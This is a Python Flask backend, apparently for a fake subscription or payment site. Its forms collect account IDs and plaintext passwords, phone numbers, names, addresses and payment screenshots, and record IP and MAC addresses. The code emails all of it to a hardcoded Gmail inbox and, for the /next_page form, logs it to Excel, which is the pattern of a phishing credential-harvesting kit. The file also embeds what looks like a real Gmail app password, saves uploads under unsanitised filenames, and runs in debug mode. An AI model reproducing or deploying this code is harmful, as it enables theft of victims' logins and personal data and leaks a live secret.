from flask import Flask, render_template, request, redirect, url_for, session
from flask_mail import Mail, Message
from openpyxl import Workbook, load_workbook
from datetime import datetime
from getmac import get_mac_address
import os

UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'

# Email configuration
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'bekirimohammed9@gmail.com'  # Update with your email credentials
app.config['MAIL_PASSWORD'] = 'fsdw gykj yirt wlhe'  # Update with your email password
app.config['MAIL_DEFAULT_SENDER'] = 'mohamedbekiri100@gmail.com'  # Update with your email

mail = Mail(app)

# File paths for Excel files
SUBSCRIPTIONS_FILE = 'subscriptions.xlsx'
PAYMENT_DETAILS_FILE = 'payment_details.xlsx'

# Function to save subscription data to Excel
def save_to_excel(plan, amount, email, idCompte, password, phone, transactionNumber, ip, mac, timestamp):
    # Load or create the Excel file
    if os.path.exists(SUBSCRIPTIONS_FILE):
        wb = load_workbook(SUBSCRIPTIONS_FILE)
    else:
        wb = Workbook()

    ws = wb.active

    # Create header row if file is new
    if ws.max_row == 1:
        ws.append(['Plan', 'Amount', 'Email', 'IdCompte', 'Password', 'Phone', 'TransactionNumber', 'IP', 'MAC', 'Timestamp'])

    # Append the new subscription data
    ws.append([plan, amount, email, idCompte, password, phone, transactionNumber, ip, mac, timestamp])

    # Save the file
    wb.save(SUBSCRIPTIONS_FILE)

@app.route('/')
def home():
    return render_template('home.html')

@app.route('/page1')
def page1():
    return render_template('page1.html')

@app.route('/page2')
def page2():
    return render_template('page2.html')

@app.route('/page3')
def page3():
    return render_template('page3.html')

@app.route('/page5')
def page5():
    return render_template('page5.html')

@app.route('/page6')
def page6():
    return render_template('page6.html')

@app.route('/page7')
def page7():
    return render_template('page7.html')

@app.route('/page8')
def page8():
    return render_template('page8.html')

@app.route('/page9')
def page9():
    return render_template('page9.html')

@app.route('/page10')
def page10():
    return render_template('page10.html')

@app.route('/page11')
def page11():
    return render_template('page11.html')

@app.route('/page12')
def page12():
    return render_template('page12.html')

@app.route('/page13')
def page13():
    return render_template('page13.html')

@app.route('/page14')
def page14():
    return render_template('page14.html')

@app.route('/next_page', methods=['POST'])
def next_page():
    if request.method == 'POST':
        plan = request.form.get('plan')
        amount = request.form.get('amount')
        email = request.form.get('email')
        idCompte = request.form.get('idCompte')
        password = request.form.get('password')
        phone = request.form.get('phone')
        transactionNumber = request.form.get('transactionNumber')
        transaction_image = request.files.get('transaction-image')

        # Get IP and MAC address
        ip = request.remote_addr
        mac = get_mac_address()

        # Get current timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Save the transaction image if it exists
        transaction_image_path = None
        if transaction_image:
            transaction_image_path = os.path.join('uploads', transaction_image.filename)
            transaction_image.save(transaction_image_path)

        # Send email notification
        send_subscription_email(plan, amount, email, idCompte, password, phone, transactionNumber, ip, mac, timestamp, transaction_image_path)

        # Save data to Excel
        save_to_excel(plan, amount, email, idCompte, password, phone, transactionNumber, ip, mac, timestamp)

        # Store data in session for next page view
        session['plan'] = plan
        session['amount'] = amount
        session['email'] = email
        session['idCompte'] = idCompte
        session['password'] = password
        session['phone'] = phone
        session['transactionNumber'] = transactionNumber
        session['ip'] = ip
        session['mac'] = mac
        session['timestamp'] = timestamp

        return redirect(url_for('next_page_view'))

    return render_template('next_page.html')

@app.route('/r222', methods=['POST'])
def r222():
    if request.method == 'POST':
        # استرجاع بيانات النموذج
        firstname = request.form.get('firstname')
        lastname = request.form.get('lastname')
        phone = request.form.get('phone')
        email = request.form.get('email')
        address = request.form.get('address')
        state = request.form.get('state')
        city = request.form.get('city')
        street = request.form.get('street')
        postal_code = request.form.get('postal_code')
        amount = request.form.get('amount')
        payment_image = request.files.get('payment_image')
        plan = request.form.get('plan')
        transactionNumber = request.form.get('transactionNumber')
        # Get IP and MAC address
        ip = request.remote_addr
        mac = get_mac_address()

        # Get current timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # معالجة صورة الدفع (حفظها، إلخ)
        transaction_image_path = None
        if payment_image:
            transaction_image_path = os.path.join(UPLOAD_FOLDER, payment_image.filename)
            payment_image.save(transaction_image_path)
            print(f"Image saved to: {transaction_image_path}")

        # إرسال إشعار بالبريد الإلكتروني
        send_payment_details(transactionNumber,plan ,firstname, lastname, email ,phone, address, state, city, street, postal_code, amount,ip, mac, timestamp, transaction_image_path)

        return render_template('r222.html',transactionNumber=transactionNumber,plan=plan, firstname=firstname, lastname=lastname, amount=amount,phone=phone,address=address,
                               state=state,postal_code=postal_code,city=city,street=street,timestamp=timestamp,email=email)
    else:
        return 'طريقة غير مسموح بها', 405

@app.route('/next_page_view')
def next_page_view():
    # Retrieve data from session and pass it to the template
    plan = session.get('plan')
    amount = session.get('amount')
    email = session.get('email')
    idCompte = session.get('idCompte')
    password = session.get('password')
    phone = session.get('phone')
    transactionNumber = session.get('transactionNumber')
    ip = session.get('ip')
    mac = session.get('mac')
    timestamp = session.get('timestamp')

    return render_template('next_page.html', plan=plan, amount=amount, email=email, idCompte=idCompte, password=password, phone=phone, transactionNumber=transactionNumber, ip=ip, mac=mac, timestamp=timestamp)

# Function to send subscription email
def send_subscription_email(plan, amount, email, idCompte, password, phone, transactionNumber, ip, mac, timestamp, transaction_image_path=None):
    msg = Message('New Subscription',
                  recipients=['mohamedbekiri100@gmail.com'])  # Update with recipient email
    msg.body = f"""
    New subscription received:
    Plan: {plan}
    Amount: {amount}
    Email: {email}
    Account ID: {idCompte}
    Password: {password}
    Phone: {phone}
    Transaction Number: {transactionNumber}
    IP Address: {ip}
    MAC Address: {mac}
    Timestamp: {timestamp}
    """
    if transaction_image_path:
        with app.open_resource(transaction_image_path) as fp:
            msg.attach(os.path.basename(transaction_image_path), 'image/png', fp.read())

    mail.send(msg)

# Function to save payment data to Excel (optional)
def save_payment_data(transactionNumber,plan,firstname, lastname,email, phone, address, state, city, street, postal_code, amount,ip, mac, timestamp):
    # Load or create the Excel file
    if os.path.exists(PAYMENT_DETAILS_FILE):
        wb = load_workbook(PAYMENT_DETAILS_FILE)
    else:
        wb = Workbook()

    ws = wb.active

    # Create header row if file is new
    if ws.max_row == 1:
        ws.append(['plan','TransactionNumber','First Name', 'Last Name','email', 'Phone', 'Address', 'State', 'City', 'Street', 'Postal Code', 'Amount', 'Timestamp', 'IP Address', 'MAC Address'])

    # Append the new payment data
    ws.append([plan,transactionNumber,firstname, lastname, email , phone, address, state, city, street, postal_code, amount, ip, mac, timestamp])

    # Save the file
    wb.save(PAYMENT_DETAILS_FILE)

# Function to send payment details email (optional)
def send_payment_details(transactionNumber,plan,firstname, lastname, email,phone, address, state, city, street, postal_code, amount,ip,mac,timestamp, transaction_image_path):
    msg = Message('Payment Details',
                  recipients=['mohamedbekiri100@gmail.com'])  # Update with recipient email
    msg.body = f"""
    Payment details received:plan={plan}   
    Type de cart and address : {street}
    First Name: {firstname}
    Last Name: {lastname}
    email={email}
    Phone: {phone}
    Address: {address}, {state}, {city},, {postal_code} 
    street :{street}
    Amount: {amount}
    TransactionNumber :{transactionNumber}
    IP Address: {ip}
    MAC Address: {mac}
    Timestamp: {timestamp}
    """

    # إرفاق الصورة إذا كانت موجودة
    if transaction_image_path and os.path.exists(transaction_image_path):
        print(f"Attaching image from: {transaction_image_path}")
        with app.open_resource(transaction_image_path) as fp:
            msg.attach(filename=os.path.basename(transaction_image_path), content_type='image/jpeg', data=fp.read())
    else:
        print("Image file not found or path is incorrect")

    mail.send(msg)



if __name__ == '__main__':
    app.run(debug=True)
